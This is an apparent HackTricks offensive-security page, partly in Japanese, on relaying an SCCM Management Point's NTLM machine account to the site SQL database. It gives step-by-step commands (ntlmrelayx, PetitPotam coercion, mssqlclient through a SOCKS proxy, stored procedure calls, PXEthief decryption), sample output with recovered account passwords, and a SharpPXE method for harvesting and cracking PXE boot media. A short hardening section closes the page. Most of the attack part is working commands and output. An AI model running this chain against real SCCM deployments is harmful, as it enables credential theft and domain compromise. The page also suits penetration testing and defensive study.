# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
By coercing a **System Center Configuration Manager (SCCM) Management Point (MP)** to authenticate over SMB/RPC and **relaying** that NTLM machine account to the **site database (MSSQL)** you obtain `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights.  These roles let you call a set of stored procedures that expose **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, etc.).  The blobs are hex-encoded/encrypted but can be decoded and decrypted with **PXEthief**, yielding plaintext secrets.

High-level chain:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP using **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. Through the SOCKS proxy connect with `mssqlclient.py -windows-auth` as the relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets such as `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc. are recovered without touching PXE or clients.

---

## 1. Enumerating unauthenticated MP endpoints
The MP ISAPI extension **GetAuth.dll** exposes several parameters that don’t require authentication (unless the site is PKI-only):

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs of *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists every Management-Point in the site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server without LDAP). |

Grab the GUIDs that will act as the **clientID** for later DB queries:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
## 2. MP マシンアカウントを MSSQL に Relay する
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
coercion が発動すると、次のような表示が見えるはずです:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---
## 3. stored procedures を介して OSD policies を特定する
SOCKS proxy (port 1080 by default) を経由して接続する:
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Switch to the **CM_<SiteCode>** DB (use the 3-digit site code, e.g. `CM_001`).

### 3.1  Unknown-Computer の GUID を見つける（任意）
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  割り当てられたポリシーを一覧表示
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Each row contains `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Focus on policies:
* **NAAConfig**  – Network Access Account の資格情報
* **TS_Sequence**  – Task Sequence の変数 (OSDJoinAccount/Password)
* **CollectionSettings**  – run-as アカウントを含むことがあります

### 3.3  フル `Body` を取得
すでに `PolicyID` と `PolicyVersion` を持っている場合、clientID の要件を次の方法で省略できます:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> 重要: SSMSで “Maximum Characters Retrieved” を (>65535) に増やしてください。そうしないと blob が切り捨てられます。

---

## 4. blob をデコード & 復号
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
取得したシークレットの例：
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. 関連する SQL ロールとプロシージャ
リレー時、ログインは次のロールにマップされます:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

これらのロールは多数の EXEC 権限を公開しており、この攻撃で使用される主要なものは次のとおりです:

| ストアドプロシージャ | 目的 |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | `clientID` に適用されたポリシーを一覧表示する。 |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | 完全なポリシー本文を返す。 |
| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` パスによって返される。 |

完全な一覧は次で確認できます:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE boot media harvesting (SharpPXE)
* **PXE reply over UDP/4011**: PXE 用に構成された Distribution Point に PXE ブート要求を送信します。proxyDHCP の応答は `SMSBoot\\x64\\pxe\\variables.dat`（暗号化された構成）や `SMSBoot\\x64\\pxe\\boot.bcd` といったブートパスを明らかにし、オプションで暗号化されたキー・ブロブを返す場合があります。
* **Retrieve boot artifacts via TFTP**: 返されたパスを使って TFTP 経由で `variables.dat` をダウンロードします（認証不要）。ファイルは小さく（数KB）暗号化されたメディア変数を含みます。
* **Decrypt or crack**:
- If the response includes the decryption key, feed it to **SharpPXE** to decrypt `variables.dat` directly.
- If no key is provided (PXE media protected by a custom password), SharpPXE emits a **Hashcat-compatible** `$sccm$aes128$...` hash for offline cracking. After recovering the password, decrypt the file.
* **Parse decrypted XML**: 復号されたプレーンテキストの変数は SCCM 展開メタデータ（**Management Point URL**、**Site Code**、メディアの GUID やその他の識別子）を含みます。SharpPXE はそれらを解析し、GUID/PFX/site パラメータが事前入力された実行可能な **SharpSCCM** コマンドを出力して追跡的な悪用を容易にします。
* **Requirements**: PXE リスナー（UDP/4011）および TFTP へのネットワーク到達性のみが必要で、ローカルの管理権限は不要です。

---

## 7. Detection & Hardening
1. **Monitor MP logins** – ホスト以外の IP からログインする MP コンピュータアカウントはリレーの可能性があるため監視する。
2. Enable **Extended Protection for Authentication (EPA)** on the site database (`PREVENT-14`) を有効化する。
3. 未使用の NTLM を無効化し、SMB signing を強制し、RPC を制限する（`PetitPotam`/`PrinterBug` に対する対策と同様）。
4. MP ↔ DB 間の通信を IPSec / mutual-TLS で強化する。
5. **Constrain PXE exposure** – UDP/4011 と TFTP を信頼できる VLAN に限定するファイアウォールルールを適用し、PXE パスワードを要求し、`SMSBoot\\*\\pxe\\variables.dat` の TFTP ダウンロードがあった場合にアラートを出す。

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
